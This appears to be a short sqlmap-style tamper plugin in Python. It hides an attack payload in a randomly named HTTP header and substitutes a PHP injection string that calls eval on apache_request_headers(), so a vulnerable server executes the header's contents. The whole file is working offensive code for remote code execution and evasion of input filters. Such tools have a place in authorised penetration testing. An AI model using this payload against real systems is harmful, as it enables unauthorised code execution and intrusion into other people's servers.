#!/usr/bin/env python

"""
See the file 'LICENSE' for copying permission
"""
import random
import string
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Appends a Header with random name, which contains the initial payload
    """
    randomName=''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

    headers = kwargs.get("headers", {})
    headers[randomName] = payload
    payload2header="{${eval(apache_request_headers()[%s])}}" % randomName

    return payload2header
